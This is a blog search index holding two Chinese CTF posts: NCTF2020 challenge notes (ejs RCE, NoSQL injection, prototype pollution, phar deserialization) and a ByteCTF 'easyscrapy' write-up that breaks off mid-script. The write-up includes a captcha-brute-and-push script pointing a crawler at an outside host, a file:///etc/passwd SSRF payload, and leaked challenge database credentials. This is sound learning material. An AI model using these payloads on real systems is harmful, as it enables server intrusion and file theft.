<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>NCTF2020-出题小记</title>
      <link href="2020/11/11/NCTF2020-%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/"/>
      <url>2020/11/11/NCTF2020-%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p><img src="https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/%E6%80%BB%E6%A6%9C.png" alt></p><a id="more"></a><p>nctf2020终于结束了。我手头的题目也基本无了 XD<br>因为这次nctf学长他们要来的奖励挺丰厚的(xray license我也想要啊),所以就把手头的题都放出来了。如果难度对新生有些劝退的话还请多多包涵。校赛前几天，甚至以为yypl要来就临时赶出了一道bg_laravel,结果被忽悠了。最后大部分师傅可能都去做祥云杯了，所以没能过来打，算是比较可惜了。</p><p>这次我的题目除了bg_laravel以外全都有人解出.(rmb师傅还有其他师傅tql)题目环境放github上了,可以自取复现。<br><a href="https://github.com/baiyecha404/My-NCTF2020-Challs" target="_blank" rel="noopener">https://github.com/baiyecha404/My-NCTF2020-Challs</a></p><h2 id="JS-world-11-solves"><a href="#JS-world-11-solves" class="headerlink" title="JS-world [11 solves]"></a>JS-world [11 solves]</h2><p>这道是专门为校赛准备的签到题目。整体思想上其实就是想展示下js在前后端的通用性。只要理解了前端源码就能推断后端逻辑。同时也想说明前端的waf等于没有waf :).加上<code>powered by ejs</code>的提示,应该不难看出用的是ejs来渲染html代码。那么直接用ejs的语句就可以RCE了.</p><p>比赛的时候本来一血很快就出了的，结果后来半天没人解。我看了眼html发现有的师傅已经可以RCE了结果就是不去看根目录的flag.txt.阿这……</p><h2 id="Mango-3-solves"><a href="#Mango-3-solves" class="headerlink" title="Mango [3 solves]"></a>Mango [3 solves]</h2><p>Mango 自然是为了玩一个mongo &lt;-&gt; mango的梗。这道题的起源比较有意思，来自于上半年某国际赛的赛题。当时题目考点是node-serialize的反序列化,不过我在黑盒测的时候意外发现那道题目还有nosql注入的漏洞存在。于是后来getshell后索性dump源码下来研究了下，也大致明白了为什么他的配置会产生nosql注入。加上后来发现这样的代码写法其实还挺常见的，所以干脆单独剥出来做成nosql注入了。</p><p>但是我的定位只是中等难度，最后只有3 solves我也很迷。不知道是因为大家没有接触过nosql注入还是什么的。我现在见过的大部分nodejs写的项目数据库都是用的mongodb,感觉出现nosql的概率还是不小的。稍微需要更换方式fuzz的地方就是json传递数据了。这个也算是比较常见的trick吧,node由于传递json导致与对象混淆的问题简直不要太多。所以第二个提示给出了<code>app.use(express.json())</code>。手抖加一个json中间件或者因为某个需求不得不加中间件(写api时),很有可能带来奇怪的问题。所以写node传参一定要记得类型检查啊。</p><h2 id="PackageManager-v1-0-v2-0-7-solves-3-solves"><a href="#PackageManager-v1-0-v2-0-7-solves-3-solves" class="headerlink" title="PackageManager v1.0/v2.0 [7 solves / 3 solves]"></a>PackageManager v1.0/v2.0 [7 solves / 3 solves]</h2><p>PackageManager 系列放了两道题。其实源码基本相差不大，2就是1的升级版。一开始的PackageManager 6月份就出好了。不过后来过了几个月后意外发现居然存在非预期。于是索性就把非预期放到第二版里并且加难了。考点其实是我觉得很值得去学习的用子进程来<code>prototype pollution to RCE</code>的一种手段.相比深挖模板污染属性的利用方法，子进程导致RCE算是大大降低了利用难度。然而国内相关文章貌似主要是先知上的一篇kibana cve分析,不过就子进程利用范围上有些差错。所以希望借此让大家重新关注下。</p><p>当然，后来意外发现这个考点第5空间线下貌似也出现过,不过我题目先出好的233。</p><p>v2除了达成RCE以外,为了增加一点难度，特意就把flag放到mongodb中了。这点根据hint.txt以及目录下的文件来推断应该不成问题。其实目的是模拟一个开发上线到生产环境的情景。比如像我这样,容易装了某个依赖写个demo，然后字段留到package.json里了,本地删了相关js代码后拿到生产环境下直接<code>npm install</code> ,就多装了没有用的依赖。所以这里就能用mongodb依赖连接内网mongodb拿flag.</p><p>然后比赛就翻车了……nunjucks把我给害了。之所以选nunjucks做模板引擎本来是因为我所知道的引擎除了nunjucks外，像hbs,ejs,pug,jade都是可以污染模板RCE的。所以没有跟源码就直接想看看有没有人非预期污染nunjucks属性的（p1g3师傅应该是找了nunjucks的污染，但是只能等我靶机每分钟重启才能看一次执行结果,没有预期解方便）。结果发现nunjucks直接模板注入根本不受这些影响…… 我v2本来目的就是说明其实不止fork,任意子进程都可以结合污染环境变量然后RCE,所以就用了<code>execSync(&#39;whoami&#39;)</code>。中间件里还考察了一个trick绕过debug路由的限制.结果模板注入直接通杀v1,v2 orz</p><p>不过貌似看v2的人不多，所以最后rmb跟p1g3师傅应该是预期做的。一血的Somnus师傅就直接非预期模板注入了……不过非预期什么的无所谓,能拿flag都是好方法,大家能学到子进程污染的知识我就比较满足了。最后比较普遍的问题是有的师傅连接mongodb代码写好后没有<code>db.close()</code>.那这本地必然是拿不到查询结果的。</p><h2 id="SimpleSimplePie-1-solves"><a href="#SimpleSimplePie-1-solves" class="headerlink" title="SimpleSimplePie [1 solves]"></a>SimpleSimplePie [1 solves]</h2><p>挖链子是不可能的，所以只能自己手写几个乱七八糟的类来构造pop链了。整体思路我感觉跟tp系列的pop chain 差不多？就是个super-mini版的<code>__toString() -&gt; __call() -&gt; call_user_func</code>调用自身函数。</p><p>然后利用则比较有意思。灵感当然就是之前做htb时发现的新姿势 ssrf 打memcache触发反序列化. 后来意外发现这样的利用其实实战中还挺不少的，比如之前安恒俊杰师傅的<code>ssrf -&gt; RCE的艰难利用</code>就是ssrf 打redis触发thinkphp反序列化.我的题相比实战还是简单多了。</p><p>这里pop链里有个小坑就是链子的起点选<code>__wakeup</code>最好。我自己当初调试的时候就发现如果用<code>__destruct</code>做起点，会因为序列化数据的一些内容触发simplepie的报错。所以写利用类时故意刁难加了个<code>__destruct</code>希望踩个坑(我爬了)。但是唯一解出的rmb师傅在选择了<code>__destruct</code>做起点后是用了phpggc里的fast destruct 来进入<code>__destruct</code>。这倒确实出乎我意料,学到了。</p><h2 id="bg-laravel-0-solves"><a href="#bg-laravel-0-solves" class="headerlink" title="bg_laravel [0 solves]"></a>bg_laravel [0 solves]</h2><p>没想到最后laravel成了防ak题……因为时临时赶的，所以很多地方写的不是很好，还请见谅。甚至由sql注入到上传getshell都是灵光一闪想出来的。</p><p>题目之所以用了保国当然是因为最近被马老师的鬼畜给洗脑了233。所以我的题目上传不给回显路径，其实是年轻人不讲武德不告诉你文件名 :) </p><p>首先在国内CTF laravel的反序列化早就被打烂了，所以我就想能不能出点新意。说起来之前七月火师傅的laravel文章下居然有人说没人这么写控制器所以反序列化没有用，这就来打脸。众所周知,phar反序列化直接扩宽了php反序列化的利用面。一个laravel站里出现的文件流操作绝对不少，那么如果能有可控点触发phar反序列化,结合pop链直接就能getshell.</p><p>但是这么考太简单了，所以自然是加点花。</p><p>刚好我最近接触到了laravel 5.8.10的很冷门的sql注入。冷门主要是因为github上修复都只是说修复了逃逸单引号的漏洞,而不是明说的sql注入漏洞。而且利用条件也有点苛刻，一个是要输入可控,另一个是回显得有json数据,否则<code>json_extract()</code>会报错。wp里给的参考文章也只是说了<code>addSelect()</code>,<code>select()</code> + json回显的数据可能会导致sql注入。可实际上，题目中出现的<code>orderby()</code>也是可以注入的。这就要看师傅们自己debug了。我自己是当初直接wrapJsonPath那下断点碰运气在可控位置一个个尝试触发才发现的。</p><p>sql注入怎么跟phar反序列化结合呢？除开可控的<code>phar://</code>输入点，我第一想法是把上传的文件名随机化，然后把文件名之类的保存在mysql里。但是很有意思的是，我在网上找了不少laravel的文件上传都用了ORM,也就是说,File类是个Eloquent model.执行<code>$file-&gt;save()</code>时对应的数据就都到了数据库里了,正合我意。</p><p>所以可能大部分师傅被这个冷门的laravel sql注入给难住了。所以还是要多谷歌+查看官方这个版本的一些小改动,说不定就能定位漏洞点了。</p><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>  总之这次比赛能看到师傅们做自己的题,顺便交流下思路还是比较开心的。希望大家明年能接着来玩，也可以期待下不知道有没有的X1CTF </p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ByteCTF2020-easyscrapy</title>
      <link href="2020/10/26/ByteCTF2020-easyscrapy/"/>
      <url>2020/10/26/ByteCTF2020-easyscrapy/</url>
      
        <content type="html"><![CDATA[<p> 这次ByteCTF的web题难度属实离谱。好几道题几乎都无法下手。自己第一天主要是看了easyscrapy以及配了beaker的环境(结果根本操作不起来，于是放弃了……)第二天上午在配scrapy的环境，一直到下午才出思路,基本上给我几小时就能出了。然而因为要赶飞机结果没时间做了……晚上到了后总归是把题目做出来了。只能说有点可惜，不然可以为小绿草拿个三/四血的。</p><p>这里我分享下自己一路下来的主要思路吧。希望能对他人有所帮助。另外写文章时环境已经关了，没啥图，将就着看吧</p><a id="more"></a><h2 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h2><p>首先题目本身给出了一个功能可以让我们输入url以及一个验证码，但是注意到这里cookie是flask的session,存储的内容与每次页面回显的验证码一致。所以首先我们可以找到减少后面的工作的方法,就是带上固定的cookie写脚本进行存储url的操作。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string, hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">URL=<span class="string">'http://39.102.69.151:30010/'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cookies=&#123;<span class="string">'session'</span>:<span class="string">'eyJjb2RlIjoiZTFiMmQ5IiwidXNlciI6IjVhNTkwZjVhLTE2ZjgtMTFlYi1hYThhLTAyNDJhYzE0MDAwNiJ9.X5XSBA.z2Nn4le-aOsM8jg82j7gMzfzhSc'</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute</span><span class="params">(code)</span>:</span></span><br><span class="line">    a = string.digits + string.ascii_lowercase + string.ascii_uppercase</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> a:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> a:</span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> a:</span><br><span class="line">                    <span class="keyword">for</span> n <span class="keyword">in</span> a:</span><br><span class="line">                        p = i + j + k + m + n</span><br><span class="line">                        s = hashlib.md5(p.encode(<span class="string">'utf-8'</span>)).hexdigest()[<span class="number">0</span>:<span class="number">6</span>]</span><br><span class="line">                        <span class="keyword">if</span> s == code:</span><br><span class="line">                            print(p)</span><br><span class="line">                            <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">()</span>:</span></span><br><span class="line">    r=requests.get(URL,cookies=cookies)</span><br><span class="line">    varify=re.findall(<span class="string">r'&lt;span&gt;substr\(md5\(\$str\), 0, 6\) === (.*)&lt;/span&gt;'</span>,r.text)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> varify</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">push</span><span class="params">(url,code)</span>:</span></span><br><span class="line">    r=requests.post(url=URL+<span class="string">'push'</span>,cookies=cookies,data=&#123;<span class="string">'url'</span>:url,<span class="string">'code'</span>:code&#125;)</span><br><span class="line">    print(r.text)</span><br><span class="line"><span class="comment">#code=brute(send())</span></span><br><span class="line"><span class="comment">#print(code)</span></span><br><span class="line">push(<span class="string">'http://120.27.246.202/'</span>,code)</span><br><span class="line"><span class="comment">#push('http://127.0.0.1:','0AUDp')</span></span><br></pre></td></tr></table></figure><p>爆破一次后就可继续用了。</p><p>之后发现，当输入完url存储后，urllist中会存在我们刚刚输入的url。之后点击则会前往<code>/result?url=xxxx</code>.似乎是一个ssrf的点。</p><p>第一天上午的话，感觉爬什么都爬不到。但是当时往自己的vps上打的时候倒是有意外的发现<br>当时的笔记:<br><img src="https://i.imgur.com/hiUBWKq.png" alt></p><p>意外发现了scrapy_redis以及pycurl。正如上面所说，url数据似乎是被存到redis然后被爬虫给爬了。而后面<code>/result?url</code>则是动用了另一种功能进行pycurl的请求。</p><p>这里pycurl无疑是值得注意的,因为pycurl本质上似乎是跟调用<code>curl</code>一样的。那么可以使用<code>gopher</code>协议。</p><p>这样一来当然就想探测redis了。不过经过尝试,会发现没有任何回显。关于版本等等信息也是一无所知。</p><p>此时再次实验打自己，我发现当更换自己服务端的内容时，<code>/result</code>所显示的页面并没改变。</p><p>联系到上面的<code>scrapy_redis</code>,我们不难推测,<code>scrapy</code>会爬我们存储的那个url,并将当时的内容缓存(后面会发现是mongodb)。所以这就导致,反复用result页面请求url并不会改变回显内容。充其量调用了pycurl请求而已。</p><p>那么，到此我们对整个服务的构架有了大概的思路</p><ol><li>存在爬虫bot</li><li>存在redis</li><li>可能存在某数据库</li><li>pycurl 是web服务请求，scrapy_redis是爬虫bot请求   </li></ol><p>但是这些信息非常局限。首先只有存进redis的数据才会被爬虫请求,这里python没有crlf必然打不了redis.而pycurl虽然可以用gopher那一套打,但是内网信息未知,且没有回显。</p><p>这时我开始尝试性爬一些网站。讽刺的是baidu能爬它自己的bytedance爬不了2333. 然后爬本机127.0.0.1也完全没有内容(因为bot开了端口的服务实际上只有一个6023的telnet,打了会提前报错,一样无回显)</p><p>那么,不妨尝试下打它的公网ip？这时我发现一个奇怪的现象。<br>当我输入它的公网ip存进redis后，它除了本身，还读取了<code>/list</code>的页面。</p><p>那么这是为什么呢？我简单看了下页面。发现里面存在<code>&lt;a href=&quot;/list&quot;&gt;&lt;/&gt;</code><br>看来，爬虫端是会根据<code>&lt;a href=&quot;xxx&quot;&gt;&lt;/a&gt;</code>进行进一步爬取.经过经典的实验打自己，发现的确它会顺着这个href进行请求。</p><p>此时已经知道href有猫腻了。然后出题人已经放出了第一个hint。就是尝试读源码。</p><p>那么我们不妨尝试下，顺着这个href+file协议进行源码的阅读？</p><h2 id="leak-source-code"><a href="#leak-source-code" class="headerlink" title="leak source code"></a>leak source code</h2><p>在自己的服务器上存储</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"file:///etc/passwd"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>接着上面的脚本跑一遍。一把梭解决问题。<br>再次访问<code>/result</code>。发现读到了<code>/etc/passwd</code></p><p>既然如此，我们依次读下其他内容<br><code>/proc/self/cmdline</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash run.sh</span><br></pre></td></tr></table></figure><p><code>/proc/self/environ</code><br>得知当前PWD是<code>/code</code></p><p>读<code>/code/run.sh</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">scrapy crawl byte</span><br></pre></td></tr></table></figure><p>使用的是scrapy框架进行爬取。</p><p>此时开始自己盲目的读结果发现啥都没读到,想了想发现这个爬虫bot可能只有这么一个命令在运行。那么我应该去查找scrapy的文档<br>我们找到scrapy官方文档</p><p><img src="https://i.imgur.com/5ZlDlDG.png" alt></p><p>显然我们只需读取<code>scrapy.cfg</code>就能拿到scrapy项目名并读取到下面所有文件。不过spider的名字似乎是自定义的</p><p><img src="https://i.imgur.com/uXo8IiC.png" alt><br><img src="https://i.imgur.com/zVeZub0.png" alt><br>前面命令行执行的是<code>scrapy crawl byte</code>那么可以确认spider的name是byte.文件名也可能是byte.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># Automatically created by: scrapy startproject</span><br><span class="line">#</span><br><span class="line"># For more information about the [deploy] section see:</span><br><span class="line"># https:&#x2F;&#x2F;scrapyd.readthedocs.io&#x2F;en&#x2F;latest&#x2F;deploy.html</span><br><span class="line"></span><br><span class="line">[settings]</span><br><span class="line">default &#x3D; bytectf.settings</span><br><span class="line"></span><br><span class="line">[deploy]</span><br><span class="line">#url &#x3D; http:&#x2F;&#x2F;localhost:6800&#x2F;</span><br><span class="line">project &#x3D; bytectf</span><br></pre></td></tr></table></figure><p>其他内容也都一并读取。<br>完整的文件我会放自己github上。包括redis跟mongodb的docker</p><p>此时我通过pipelines.py与settings.py分别得到了mongodb与redis的配置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">//pipelines.py</span><br><span class="line"><span class="keyword">import</span> pymongo</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BytectfPipeline</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line"></span><br><span class="line">        MONGODB_HOST = <span class="string">'127.0.0.1'</span></span><br><span class="line">        MONGODB_PORT = <span class="number">27017</span></span><br><span class="line">        MONGODB_DBNAME = <span class="string">'result'</span></span><br><span class="line">        MONGODB_TABLE = <span class="string">'result'</span></span><br><span class="line">        MONGODB_USER = <span class="string">'N0rth3'</span></span><br><span class="line">        MONGODB_PASSWD = <span class="string">'E7B70D0456DAD39E22735E0AC64A69AD'</span></span><br><span class="line">        mongo_client = pymongo.MongoClient(<span class="string">"%s:%d"</span> % (MONGODB_HOST, MONGODB_PORT))</span><br><span class="line">        mongo_client[MONGODB_DBNAME].authenticate(MONGODB_USER, MONGODB_PASSWD, MONGODB_DBNAME)</span><br><span class="line">        mongo_db = mongo_client[MONGODB_DBNAME]</span><br><span class="line">        self.table = mongo_db[MONGODB_TABLE]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_item</span><span class="params">(self, item, spider)</span>:</span></span><br><span class="line"></span><br><span class="line">        quote_info = dict(item)</span><br><span class="line">        print(quote_info)</span><br><span class="line">        self.table.insert(quote_info)</span><br><span class="line">        <span class="keyword">return</span> item</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//settings.py</span><br><span class="line">BOT_NAME = <span class="string">'bytectf'</span></span><br><span class="line">SPIDER_MODULES = [<span class="string">'bytectf.spiders'</span>]</span><br><span class="line">NEWSPIDER_MODULE = <span class="string">'bytectf.spiders'</span></span><br><span class="line">RETRY_ENABLED = <span class="literal">False</span></span><br><span class="line">ROBOTSTXT_OBEY = <span class="literal">False</span></span><br><span class="line">DOWNLOAD_TIMEOUT = <span class="number">8</span></span><br><span class="line">USER_AGENT = <span class="string">'scrapy_redis'</span></span><br><span class="line">SCHEDULER = <span class="string">"scrapy_redis.scheduler.Scheduler"</span></span><br><span class="line">DUPEFILTER_CLASS = <span class="string">"scrapy_redis.dupefilter.RFPDupeFilter"</span></span><br><span class="line">REDIS_HOST = <span class="string">'172.20.0.7'</span></span><br><span class="line">REDIS_PORT = <span class="number">6379</span></span><br><span class="line">ITEM_PIPELINES = &#123;</span><br><span class="line"> <span class="string">'bytectf.pipelines.BytectfPipeline'</span>: <span class="number">300</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以及主要的爬虫逻辑。知道了文件读取的漏洞所在</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> scrapy_redis.spiders <span class="keyword">import</span> RedisSpider</span><br><span class="line"><span class="keyword">from</span> bytectf.items <span class="keyword">import</span> BytectfItem</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ByteSpider</span><span class="params">(RedisSpider)</span>:</span></span><br><span class="line">    name = <span class="string">'byte'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self, response)</span>:</span></span><br><span class="line">        byte_item = BytectfItem()</span><br><span class="line">        byte_item[<span class="string">'byte_start'</span>] = response.request.url</span><br><span class="line">        url_list = []</span><br><span class="line">        test = response.xpath(<span class="string">'//a/@href'</span>).getall()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> test:</span><br><span class="line">            <span class="keyword">if</span> i[<span class="number">0</span>] == <span class="string">'/'</span>:</span><br><span class="line">                url = response.request.url + i</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                url = i</span><br><span class="line">            <span class="keyword">if</span> re.search(<span class="string">r'://'</span>,url):</span><br><span class="line">                r = scrapy.Request(url,callback=self.parse2,dont_filter=<span class="literal">True</span>)</span><br><span class="line">                r.meta[<span class="string">'item'</span>] = byte_item</span><br><span class="line">                <span class="keyword">yield</span> r</span><br><span class="line">            url_list.append(url)</span><br><span class="line">            <span class="keyword">if</span>(len(url_list)&gt;<span class="number">3</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        byte_item[<span class="string">'byte_url'</span>] = response.request.url</span><br><span class="line">        byte_item[<span class="string">'byte_text'</span>] = base64.b64encode((response.text).encode(<span class="string">'utf-8'</span>))</span><br><span class="line">        <span class="keyword">yield</span> byte_item</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse2</span><span class="params">(self,response)</span>:</span></span><br><span class="line">        item = response.meta[<span class="string">'item'</span>]</span><br><span class="line">        item[<span class="string">'byte_url'</span>] = response.request.url</span><br><span class="line">        item[<span class="string">'byte_text'</span>] = base64.b64encode((response.text).encode(<span class="string">'utf-8'</span>))</span><br><span class="line">        <span class="keyword">yield</span> item</span><br></pre></td></tr></table></figure><p>可是这有什么用呢……我们一样不知道flag在哪。目前看来,如果flag在bot机器上,那么只有可能会是打redis。并且按照我自己的少数经验，一般是搭配pickle反序列化rce才有可能。但是这里并没有明显的pickle反序列化代码。</p><p>此时陷入僵局，只有本地调试一下看看有没有意外发生了。</p><h2 id="Run-it-locally"><a href="#Run-it-locally" class="headerlink" title="Run it locally"></a>Run it locally</h2><p>这道题最重要的一点恐怕就是本地跑了。毕竟此时我们对环境一无所知,我唯一能想到的getshell方法也只有pickle反序列化了。那么试试本地，看看有没有键存了pickle序列化后的数据？这样一来必然有某个地方存在反序列化。</p><p>经过一番折腾后。我简单写了个起mongodb的docker.因为redis跟爬虫本地起比较轻松,我又不想改代码。<br>(后面比赛结束时写了个完整版的,直接起应该跟线上的bot+redis+mongo环境基本一致了)<br>docker-compose.yml</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'3'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">    <span class="attr">mongodb:</span></span><br><span class="line">      <span class="attr">image:</span> <span class="string">mongo:4.2</span></span><br><span class="line">      <span class="attr">container_name:</span> <span class="string">py_db</span></span><br><span class="line">      <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">      <span class="attr">environment:</span></span><br><span class="line">        <span class="attr">MONGO_INITDB_ROOT_USERNAME:</span> <span class="string">root</span></span><br><span class="line">        <span class="attr">MONGO_INITDB_ROOT_PASSWORD:</span> <span class="string">root</span> </span><br><span class="line">        <span class="attr">MONGO_INITDB_DATABASE:</span> <span class="string">result</span></span><br><span class="line">      <span class="attr">volumes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">./mongo-init.js:/docker-entrypoint-initdb.d/mongo-init.js:ro</span></span><br></pre></td></tr></table></figure><p>同目录下mongo-init.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data=&#123;<span class="string">"test"</span>:<span class="string">"123"</span>&#125;<span class="comment">//just for test</span></span><br><span class="line">db.result.drop();</span><br><span class="line">db.result.insert(data);</span><br><span class="line">db.createUser(&#123;</span><br><span class="line">    user: <span class="string">"N0rth3"</span>,</span><br><span class="line">    pwd:  <span class="string">"E7B70D0456DAD39E22735E0AC64A69AD"</span>,</span><br><span class="line">    roles: [ &#123; <span class="attr">role</span>: <span class="string">"readWrite"</span>, <span class="attr">db</span>: <span class="string">"result"</span>, <span class="attr">collection</span>:<span class="string">"result"</span> &#125;]</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>简单改下爬虫的redis/mongodb ip ,就能开跑了</p><p><img src="https://i.imgur.com/znmnKI4.png" alt></p><p>然后此时我发现一点动静的都没有。感觉非常奇怪。倒是看到scrapy它在准备读<code>byte:start_urls</code></p><p>既然如此那<code>set xx xxx</code>试试看好了。结果突然发现爬虫直接异常退出？</p><p>看了下报错。似乎是在执行redis的LPOP操作报错的。那可能是数据类型的问题了。找了下一篇文章发现了原因。</p><p><a href="https://blog.csdn.net/zwq912318834/article/details/78854571" target="_blank" rel="noopener">https://blog.csdn.net/zwq912318834/article/details/78854571</a><br>它爬虫的逻辑跟我们的基本一致。属于分布式爬虫。即等待redis中出现redis_key再进行爬取。<br>而这里因为不是简单的从字符串进行读取，而是从一个队列里读一个元素。那么自然不会读到内容了。</p><p>期间,转战虚拟机起服务。这一次我们用脚本写入数据。其实就是执行lpush而已。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"></span><br><span class="line">redis_Host = <span class="string">"127.0.0.1"</span></span><br><span class="line">redis_key = <span class="string">'byte:start_urls'</span></span><br><span class="line">rediscli = redis.Redis(host = redis_Host, port = <span class="number">6379</span>, db = <span class="string">"0"</span>)</span><br><span class="line">rediscli.lpush(redis_key, <span 